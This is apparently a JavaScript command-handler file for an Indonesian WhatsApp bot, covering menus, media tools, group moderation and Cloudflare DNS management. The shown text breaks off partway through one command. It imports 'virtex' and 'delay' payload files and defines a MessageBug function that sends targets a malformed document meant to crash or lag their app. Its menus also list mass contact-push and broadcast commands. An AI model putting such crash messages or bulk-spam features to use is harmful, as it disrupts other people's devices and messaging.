module.exports = async (Skyzo, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Skyzo.decodeJid(Skyzo.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Skyzo.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const antilink = JSON.parse(fs.readFileSync('./all/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./all/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const { teksbug1 } = require("./all/database/virtex.js")
const { teksbug2 } = require("./all/database/delay.js")


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}

const MessageBug = async (target) => {
return Skyzo.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Skyzo.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Skyzo.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/4b74d33cc26cbb9bfd120.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Skyzo.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await Skyzo.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Skyzo.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Skyzo.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://telegra.ph/file/4b74d33cc26cbb9bfd120.jpg", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Skyzo.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: body}}}

const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot JPM By Skzyoo`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `WhatsApp Bot Pushkontak By Skzyo`,jpegThumbnail: ""}}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


switch (command) {
case "menu": case "p": case "pp": {
let anuan = "Powered By " + namaowner
let teksnya = `
Haii @${m.sender.split("@")[0]},\nAda Yang Bisa Saya Bantu Kak?`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: "© "+global.namabot 
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fetch(global.image)}, { upload: Skyzo.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "List Menu", "sections": [{ "title": "# Pilih Salah Satu Menu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Allmenu", "title": "List All Fitur Bot", "id": ".allmenu" }, 
{ "header": "Mainmenu", "title": "List Main Menu", "id": ".mainmenu" }, 
{ "header": "Produkmenu", "title": "List Produk Owner", "id": ".produkmenu" }, 
{ "header": "Downloader", "title": "List Download Menu", "id": ".downloadmenu" }, 
{ "header": "Converter", "title": "List Convert Menu", "id": ".convertmenu" }, 
{ "header": "Panelmenu", "title": "List Panel Menu", "id": ".panelmenu" }, 
{ "header": "Domainmenu", "title": "List Domain Menu", "id": ".domainmenu" }, 
{ "header": "Pushkontakmenu", "title": "List Pushkontak Menu", "id": ".pushkontakmenu" }, 
{ "header": "Grupmenu", "title": "List Grup Menu", "id": ".grupmenu" }, 
{ "header": "Ownermenu", "title": "List Owner Menu", "id": ".ownermenu" }]}]}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Contact Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
},
{ 
"name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Allmenu\",\"id\":\".allmenu\"}" 
}]
}) 
})} 
}}, {userJid: m.sender, quoted: qdoc}) 
await Skyzo.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "allmenu": {
let teksmenu = `
Haii @${m.sender.split("@")[0]}\nSelamat ${ucapan()}
 
*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* pinterest
* qc
  
*乂 L I S T P R O D U C T*
* panel
* vps
* domain
* scriptbot
  
*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* facebook
* ytmp3
* mediafire
  
*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
  
*乂 P A N E L M E N U*
* addadmin
* addpanel
* listpanel
* listadmin
* deladmin
* delpanel
  
*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
  
*乂 P U S H M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmpoll
* jpmtesti
* jpmhidetag
* startjpm
* setteksjpm
* teksjpm

*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
  
*乂 O W N E R M E N U*
* clearsession
* anticall
* autoread
* welcome
* setpppanjang
* setnamabot
* setbiobot
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "mainmenu": {
let teksmenu = `
*乂 M A I N M E N U*
* play
* tourl
* yts
* tohd
* chatgpt
* ai
* remini
* sticker
* pinterest
* qc
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "downloadmenu": {
let teksmenu = `
*乂 D O W N L O A D E R*
* tiktok
* tiktokmp3
* tiktokaudio
* facebook
* ytmp3
* mediafire
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "produkmenu": {
let teksmenu = `
*乂 L I S T P R O D U C T*
* panel
* vps
* domain
* scriptbot
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "pushkontakmenu": {
let teksmenu = `
*乂 P U S H M E N U*
* pushkontak
* pushkontak1
* pushkontak2
* savekontak
* savekontak2
* listgc
* idgc
* jpm
* jpm2
* jpmpoll
* jpmtesti
* jpmhidetag
* startjpm
* setteksjpm
* teksjpm
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "convertmenu": {
let teksmenu = `
*乂 C O N V E R T E R*
* toaudio
* tomp3
* tovn
* toptv
* tts
* toimage
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "panelmenu": {
let teksmenu = `
*乂 P A N E L M E N U*
* addadmin
* addpanel
* listpanel
* listadmin
* deladmin
* delpanel
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "domainmenu": {
let teksmenu = `
*乂 D O M A I N M E N U*
* listdomain
* listsubdomain
* delsubdomain
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "grupmenu": {
let teksmenu = `
*乂 G R O U P M E N U*
* addmember
* antilink
* antilinkV2
* hidetag
* tagall
* delete
* open/close
* setnamagc
* setdeskgc
* setppgc
* kick
* promote
* leavegc
* leavegc2
* demote
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "ownermenu": {
let teksmenu = `
*乂 O W N E R M E N U*
* clearsession
* anticall
* autoread
* welcome
* setpppanjang
* setnamabot
* setbiobot
`
Skyzo.sendMessage(m.chat, {text: teksmenu, mentions: [m.sender]}, {quoted: qchanel})
}
break
case "yts": {
if (!text) return m.reply(example("Dj Tiktok"))
await m.reply(msg.wait)
await yts(text).then(async (data) => {
if (data.all.length == 0) return m.reply(mess.error)
let teks = '\n*🔎Hasil Pencarian YOUTUBE*\n\n'
for (let i of data.all) {
teks += `*◦ Judul :* ${i.title}
*◦ Channel :* ${i.author?.name || "unknown"}
*◦ Durasi :* ${i?.timestamp || "unknown"}
*◦ Link Url :* ${i.url}\n\n`
}
m.reply(teks)
}).catch(err => m.reply(err.toString()))
}
break
case "ytmp3": case "ytdl": {
if (!text) return m.reply(example('linknya'))
if (!text.includes("https")) return m.reply("Link Tautan Tidak Valid!")
if (!text.includes("youtu")) return m.reply("Link Tautan Tidak Valid!")
m.reply(msg.wait)
var judul = `./all/tmp/${getRandom(".mp3")}`
const videoURL = text
const options = {
  quality: 'highestaudio',
  filter: 'audioonly'
}
ytdl(videoURL, options)
  .pipe(fs.createWriteStream(judul))
  .on('finish', async function () {
var ai = await yts(text)
var vid = ai.videos[0]
try {
let { title, thumbnail: thumb, timestamp, author, url } = vid
await Skyzo.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg', contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: thumb, title: title, body: `Duration : ${timestamp} | Author : ${author.name}`, sourceUrl: null,  renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
await fs.unlinkSync(judul)
} catch (e) {
await Skyzo.sendMessage(m.chat, {audio: fs.readFileSync(judul), mimetype: 'audio/mpeg'}, {quoted: m})
await fs.unlinkSync(judul)
}
}).on('error', (err) => {
return m.reply(err.toString())
})}
break
case "setppbot": case "setpp": {
if (!isOwner) return m.reply(msg.owner)
if (/image/g.test(mime)) {
let media = await Skyzo.downloadAndSaveMediaMessage(qmsg)
await Skyzo.updateProfilePicture(botNumber, {url: media})
await fs.unlinkSync(media)
m.reply("Berhasil Mengganti Foto Profile Bot ✅")
} else return m.reply(example('dengan mengirim foto'))}
break
case "setppbotpanjang": case "setpppanjang": {
if (!isOwner) return m.reply(msg.owner)
if (/image/g.test(mime)) {
var medis = await Skyzo.downloadAndSaveMediaMessage(qmsg, 'ppbot.jpeg', false)
var { img } = await generateProfilePicture(medis)
await Skyzo.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
await fs.unlinkSync(medis)
m.reply("Berhasil Mengganti Foto Profil Bot ✅")
} else return m.reply(example('dengan mengirim foto'))
}
break
case "setbio": case "setbiobot": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example('teksnya'))
Skyzo.updateProfileStatus(text)
m.reply("Berhasil Mengganti Bio Bot ✅")
}
break
case "listdomain": {
var teks = `*List Domain Yang Tersedia :*

.domain1 ${global.tld1}
.domain2 ${global.tld2}
.domain3 ${global.tld3}

*Contoh Cara Membuat Subdomain :*
ketik *.domain1* hostname|ipvps

*Contoh Cara Melihat Subdomain :*
ketik *.listsubdomain domain1*
`
m.reply(teks)
}
break
case "listsubdmain": case "listsubdo": {
if (!isOwner) return m.reply(msg.owner)
if (!args[0]) return m.reply(example("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"))
let zonenya
let apinya
let dom = args[0].toLowerCase()
if (/domain1/.test(dom)) {
zonenya = global.zone1
apinya = global.apitoken1
} else if (/domain2/.test(dom)) {
zonenya = global.zone2
apinya = global.apitoken2
} else if (/domain3/.test(dom)) {
zonenya = global.zone3
apinya = global.apitoken3
}
axios.get(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,{
headers: {
Authorization: "Bearer " + `${apinya}`,
"Content-Type": "application/json",
},
}).then(async (res) => {
if (res.data.result.length < 1) return m.reply("Tidak Ada Subdomain")
var teks = `*🌐 LIST SUBDOMAIN ${dom.toUpperCase()}*\n\n*Total Subdomain :* ${res.data.result.length}\n\n`
await res.data.result.forEach(e => teks += `*Domain :* ${e.name}\n*IP :* ${e.content}\n\n`)
return m.reply(teks)
})
}
break
case "domain1": case "domain2": case "domain3": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("host|ip"))
if (!text.split("|")) return m.reply(example("host|ip"))
let zonenya
let apinya
let tldnya
let dom = args[0].toLowerCase()
if (/domain1/.test(command)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(command)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(command)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
}
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
   
let raw1 = text
if (!raw1) return m.reply(example("host|ip"))
let host1 = raw1.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "")
if (!host1) return m.reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)")
let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "IP Tidak Valid!" : "Isi IP Servernya!")
await subDomain1(host1.toLowerCase(), ip1).then((e) => {
if (e['success']) m.reply(`*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n${tldnya}\n*IP 📡*\n${e['ip']}\n*Subdomain 🌐*\n${e['name']}`)
else m.reply(`${e['error']}`)
})}
break
case "delsubdo": case "delsubdomain": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
if (!text.split("|")) return m.reply(example("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"))
var [pusat, sub] = text.split("|")
var zonenya
var apinya
var tldnya
if (/domain1/.test(pusat)) {
zonenya = global.zone1
apinya = global.apitoken1
tldnya = global.tld1
} else if (/domain2/.test(pusat)) {
zonenya = global.zone2
apinya = global.apitoken2
tldnya = global.tld2
} else if (/domain3/.test(pusat)) {
zonenya = global.zone3
apinya = global.apitoken3
tldnya = global.tld3
} else return m.reply("Domain Tidak Ditemukan")
if (!sub.includes(".")) return m.reply("Format Subdomain Tidak Valid!")
var host = sub.toLowerCase()
var dom = null
var id = null
await axios.get(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, {
headers: {
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
},
}).then(async (res) => {
await res.data.result.forEach((e) => {
if (e.name == host) {
dom = e.name
id = e.id
}})
})
if (dom == null && id == null) return m.reply("Subdomain Tidak Ditemukan")
await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
Authorization: "Bearer " + apinya,
"Content-Type": "application/json",
}
})
m.reply(`Berhasil Menghapus Subdomain *${dom}* Dari Domain *${tldnya}*`)
}
break
case "tts": {
if (!text) return m.reply(example("Hallo saya manusia"))
if (text.length >= 300) return m.reply("Jumlah huruf harus di bawah 300!")
m.reply(msg.wait)
let id = 'id_001'
try {
const { data } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", {
    "text": text,
    "voice": id
})
Skyzo.sendMessage(m.chat, { audio: Buffer.from(data.data, "base64"), mimetype: "audio/mp4" }, {quoted: m})
} catch (e) {
return m.reply(e.toString())
}
}
break
case "ytplay": case "play": {
if (!text) return m.reply(example('Dj tiktok'))
m.reply(msg.wait)
const { pipeline } = require('stream')
const { promisify } = require('util')
const streamPipeline = promisify(pipeline)
try {
let search = await yts(text)
let vid = search.videos[0]
let { title, thumbnail: thumb, timestamp, author, url } = vid
const audioStream = ytdl(url, {
filter: 'audioonly',
quality: 'highestaudio'})
let acak = await getRandom(".mp3")
const writableStream = fs.createWriteStream(`./all/tmp/${acak}`)
await streamPipeline(audioStream, writableStream)
await Skyzo.sendMessage(m.chat, {audio: fs.readFileSync(`./all/tmp/${acak}`), mimetype: 'audio/mpeg', contextInfo: {externalAdReply: {thumbnailUrl: thumb, title: title, body: "Duration : "+timestamp+" | "+"Author : "+author.name, sourceUrl: url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
fs.unlinkSync(`./all/tmp/${acak}`)
} catch (e) {
return m.reply(e.toString())
}
}
break
case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let ppuser
try {
ppuser = await Skyzo.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const obj = {
      "type": "quote",
      "format": "png",
      "backgroundColor": reswarna,
      "width": 512,
      "height": 768,
      "scale": 2,
      "messages": [{
         "entities": [],
         "avatar": true,
         "from": {
            "id": 1,
            "name": m.pushName,
            "photo": {
               "url": ppuser
            }
         },
         "text": text,
         "replyMessage": {}
      }]
   }
   try {
   const json = await axios.post('https://quote.btch.bz/generate', obj, {
      headers: {
         'Content-Type': 'application/json'
      }
   })
   const buffer = Buffer.from(json.data.result.image, 'base64')
Skyzo.sendStimg(m.chat, buffer, m, { packname: global.packname })
   } catch (error) {
   m.reply(error.toString())
   }
}
break
case "vps": {
let teks = `*List Harga VPS By ${namaowner} ⚡*
*(ISP Digital Ocean)*
* 📦 Ram 1GB Cpu 1Core : Rp15.000
* 📦 Ram 2GB Cpu 1Core : Rp25.000
* 📦 Ram 2GB Cpu 2Core : Rp35.000
* 📦 Ram 4GB Cpu 2Core : Rp40.000
* 📦 Ram 8GB Cpu 4Core : Rp50.000
*(Bisa Request OS,Region & Versi OS)*

*Rules Pembelian VPS!!*
* Simpan Data Dengan Baik! Data Hilang Seller Tidak Akan Bertanggung Jawab
* Garansi ON 10 Days (jika tidak melanggar tos)
* Claim Garansi Wajib Bawa Bukti Transaksi!
* Free Install Panel
* Free Request Nama Domain
* Free Instal Tema Untuk Ram 4/8

Minat ? Hubungi Ownerbot Dengan Cara Ketik *.owner*
`
Skyzo.sendMessage(m.chat, {text: teks}, {quoted: qloc})
}
break
case "domain": {
let teks = `*List Harga Domain By ${namaowner} ⚡*

* 🌐 Domain my.id : Rp15.000
* 🌐 Domain biz.id : Rp15.000
* 🌐 Domain .site : Rp25.000
* 🌐 Domain .store : Rp25.000
* 🌐 Domain .online : Rp25.000
* 🌐 Domain .fun : Rp25.000
* 🌐 Domain .cloud : Rp25.000
* 🌐 Domain .icu : Rp25.000
*(Durasi Aktif Domain 1 Tahun & Free Kaitin Domain Ke Cloudflare)*

Minat ? Hubungi Ownerbot Dengan Cara Ketik *.owner*
`
Skyzo.sendMessage(m.chat, {text: teks}, {quoted: qloc})
}
break
break
case "panel": {
const teks = `*List Harga Panel By ${namaowner} ⚡*

*📦 Ram 1GB Cpu 40%*
_Harga : Rp2000_

*📦 Ram 2GB Cpu 50%*
_Harga Rp3000_

*📦 Ram 3GB Cpu 60%*
_Harga : Rp4000_

*📦 Ram 4GB Cpu 80%*
_Harga : Rp5000_

*📦 Ram 5GB Cpu 110*
_Harga Rp6000_

*📦 Ram 6GB Cpu 120%* 
_Harha Rp7000_

*📦 Ram 7GB Cpu 130%* 
_Harga Rp8000_

*📦 Ram 8GB Cpu 150%* 
_Harga Rp9000_

*📦 Ram & Cpu Unlimited* 
_Harga Rp10.000_

*Keuntungan Panel :*
* Server *(High Quality)*
* Bot Auto Fast Respon
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Bawa Bukti Transaksi!

*Ready Juga Resseller Panel ✅*
* *Harga :* Rp10.000/Bulan
* Create Panel Lewat Bot

Minat ? Hubungi Ownerbot Dengan Cara Ketik *.owner*
`
Skyzo.sendMessage(m.chat, {text: teks}, {quoted: qloc})
}
break
case "remini": case "tohd": case "hd": {
if (/image/g.test(mime)) {
m.reply(msg.wait)
let tingkat
if (/remini/gi.test(command)) tingkat = 4
if (/tohd|hd/gi.test(command)) tingkat = 2
await Skyzo.downloadAndSaveMediaMessage(qmsg).then(async (res) => {
let urlnya = await telegraPh(res)
let image = await fetchJson(`https://aemt.me/remini?url=${urlnya}&resolusi=${tingkat}`)
if (!image.status) return m.reply("Error!")
await Skyzo.sendMessage(m.chat, {image: {url: image.url}, caption: "Berhasil ✅"}, {quoted: m})
await fs.unlinkSync(res)
}).catch(err => m.reply(err.toString()))
} else return m.reply(example('dengan mengirim foto'))
}
break
case "chatgpt": case "gpt": {
if (!text) return m.reply(example("apa itu nodejs"))
m.reply(msg.wait)
await fetchJson(`https://aemt.me/gpt4?text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `*© GPT - Chat Version 0.4*\n\n${e.result}`
m.reply(teks)
})
}
break
case "ai": case "openai": {
if (!text) return m.reply(example("kamu siapa"))
m.reply(msg.wait)
await fetchJson(`https://aemt.me/openai?text=${text}`).then((e) => {
if (!e.status) return m.reply(JSON.stringify(e, null, 2))
var teks = `*© AI - Asistent New Latest*\n\n${e.result}`
m.reply(teks)
})
}
break
case "toptv": {
if (/video/.test(qmsg.mimetype)) {
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik!")
let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: qmsg }), { userJid: m.chat, quoted: m })
Skyzo.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id })
} else { 
return m.reply(example("dengam mengirim/balas vidio"))
}
}
break
case "toimage": {
if (!/webp/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan reply sticker'))
m.reply(msg.wait)
let media = await Skyzo.downloadAndSaveMediaMessage(qmsg)
let ran = `${makeid}.png`
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
Skyzo.sendMessage(m.chat, {image: buffer}, {
quoted: m})
fs.unlinkSync(ran)
})
}
break
case "tovn": case "toptt": {
if (!/video|audio/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim audio/vidio'))
m.reply(msg.wait)
await Skyzo.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toPTT(res, 'mp4')
Skyzo.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg', ptt: true}, {quoted : m}) 
})
}
break
case "toaudio": case "tomp3": {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(example('dengan mengirim vidio'))
if ((qmsg).seconds > 30) return m.reply("Durasi vidio maksimal 30 detik")
m.reply(msg.wait)
await Skyzo.downloadMediaMessage(qmsg).then(async (res) => {
let anu = await toAudio(res, 'mp4')
Skyzo.sendMessage(m.chat, {audio: anu, mimetype: 'audio/mpeg'}, {quoted : m}) 
})
}
break
case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return m.reply(example("dengan mengirim foto/vidio"))
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
m.reply(msg.wait)
var media = await Skyzo.downloadAndSaveMediaMessage(qmsg)
await Skyzo.sendStimg(m.chat, media, m, {packname: "Whatsapp Bot 2024"})
await fs.unlinkSync(media)
}
break
case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan mengirim foto"))
await m.reply(msg.wait)
var fotonya = await Skyzo.downloadAndSaveMediaMessage(qmsg)
var urlimage = await telegraPh(fotonya)
await m.reply(`${urlimage}`)
